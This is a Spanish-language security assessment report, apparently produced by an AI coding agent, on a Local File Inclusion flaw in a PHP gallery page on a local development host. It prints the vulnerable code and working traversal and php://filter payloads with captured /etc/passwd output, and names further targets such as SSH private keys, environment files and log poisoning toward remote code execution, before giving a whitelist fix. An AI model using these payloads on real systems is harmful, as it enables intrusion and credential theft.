# Informe de Análisis de Seguridad: Local File Inclusion (LFI)

**Objetivo:** http://web.dev.local:8081  
**Fecha:** 2026-04-30  
**Analista:** GitHub Copilot CLI (claude-sonnet-4.6)  
**Clasificación:** VULNERABILIDAD CRÍTICA

---

## Resumen Ejecutivo

Se ha identificado y explotado con éxito una vulnerabilidad de **Local File Inclusion (LFI)** en el parámetro `page` del archivo `gallery.php`. La vulnerabilidad permite a un atacante leer archivos arbitrarios del sistema de archivos del servidor, incluyendo archivos de configuración, credenciales y otros datos sensibles.

---

## Descripción Técnica

### Endpoint Vulnerable

```
http://web.dev.local:8081/gallery.php?page=<PAYLOAD>
```

### Parámetro Afectado

- **Parámetro:** `page` (GET)
- **Archivo:** `gallery.php`

### Código Fuente Vulnerable (extraído via LFI)

```php
<?php
$page = $_GET['page'] ?? 'modern';
?>
...
<?php
// Check if the page parameter contains file extension
if (strpos($page, '.') !== false) {
    // If it has an extension, use it as-is 
    $file = $page;
} else {
    // Otherwise, assume it's a page in the pages directory
    $file = "pages/" . $page . ".php";
}

if (file_exists($file)) {
    include($file);
} else {
    echo "<div class='error'>";
    echo "<h3>Página no encontrada</h3>";
    echo "<p>El archivo solicitado no existe: " . htmlspecialchars($file) . "</p>";
    echo "</div>";
    // Try to include anyway
    @include($file);
}
?>
```

### Causa Raíz

La aplicación utiliza el valor del parámetro `page` directamente en una función `include()` de PHP sin ninguna sanitización ni validación adecuada. Cuando el parámetro contiene un punto (`.`), el valor se usa tal cual como ruta de archivo, permitiendo rutas relativas con traversal (`../`).

---

## Explotación

### Payload Básico - Lectura de `/etc/passwd`

```
GET /gallery.php?page=../../../etc/passwd HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
```

### Payload con PHP Filter - Lectura de Código Fuente PHP

```
GET /gallery.php?page=php://filter/read=convert.base64-encode/resource=/var/www/html/gallery.php HTTP/1.1
Host: web.dev.local:8081
```

**Resultado:** Código fuente PHP de `gallery.php` codificado en Base64 (decodificado exitosamente).

### Información del Sistema Obtenida

| Archivo | Información Obtenida |
|---------|---------------------|
| `/etc/passwd` | Lista de usuarios del sistema |
| `/proc/version` | `Linux version 6.8.0-110-generic (Ubuntu 13.3.0-6ubuntu2~24.04.1)` |
| `/etc/hosts` | `127.0.0.1 localhost`, `172.19.0.2 d5054e367753` |
| `gallery.php` (base64) | Código fuente completo de la aplicación |

---

## Vectores de Ataque Adicionales

Con esta vulnerabilidad LFI también sería posible:

1. **Lectura de archivos de configuración:** `/etc/apache2/sites-enabled/*.conf`, archivos `.env`, `config.php`
2. **Lectura de logs del servidor:** `/var/log/apache2/access.log`, `/var/log/apache2/error.log`
3. **Log Poisoning → RCE:** Si se tiene acceso de escritura a logs, inyectar código PHP y luego incluirlos para lograr ejecución remota de código (RCE)
4. **Lectura de claves SSH:** `/root/.ssh/id_rsa`, `/home/user/.ssh/id_rsa`
5. **Enumeración de procesos:** `/proc/self/environ`, `/proc/self/cmdline`

---

## Clasificación de Riesgo

| Criterio | Puntuación |
|----------|-----------|
| **CVSS Base Score** | 7.5 (Alto) |
| **Vector de Acceso** | Red |
| **Complejidad** | Baja |
| **Privilegios Requeridos** | Ninguno |
| **Interacción de Usuario** | Ninguna |
| **Impacto en Confidencialidad** | Alto |
| **CWE** | CWE-22 (Path Traversal), CWE-98 (PHP File Inclusion) |

---

## Recomendaciones

### Corrección Inmediata

1. **Validar y sanitizar el parámetro `page`:** Usar una lista blanca de páginas permitidas.

```php
// Ejemplo de corrección con lista blanca
$allowed_pages = ['modern', 'classic', 'abstract', 'about'];
$page = $_GET['page'] ?? 'modern';

if (!in_array($page, $allowed_pages)) {
    $page = 'modern'; // Página por defecto
}

$file = "pages/" . $page . ".php";
include($file);
```

2. **Eliminar la lógica que permite rutas con extensiones arbitrarias.**
3. **Deshabilitar `allow_url_include` y `allow_url_fopen` en `php.ini`.**
4. **Aplicar el principio de mínimo privilegio** al proceso del servidor web.

### Medidas Adicionales

- Implementar un **Web Application Firewall (WAF)** que detecte patrones de path traversal
- Configurar `open_basedir` en PHP para restringir el acceso al sistema de archivos
- Revisar todos los parámetros de la aplicación que puedan usarse para cargar archivos
- Realizar auditorías de seguridad periódicas

---

## Conclusión

La vulnerabilidad LFI encontrada en `gallery.php` es crítica y explotable de forma trivial sin autenticación. Se logró leer archivos sensibles del sistema como `/etc/passwd` y el propio código fuente de la aplicación. Se recomienda una corrección inmediata mediante la implementación de una lista blanca de páginas permitidas.

---

*Informe generado el: 2026-04-30T16:05:59Z*  
*Herramienta: GitHub Copilot CLI - Análisis de Seguridad*
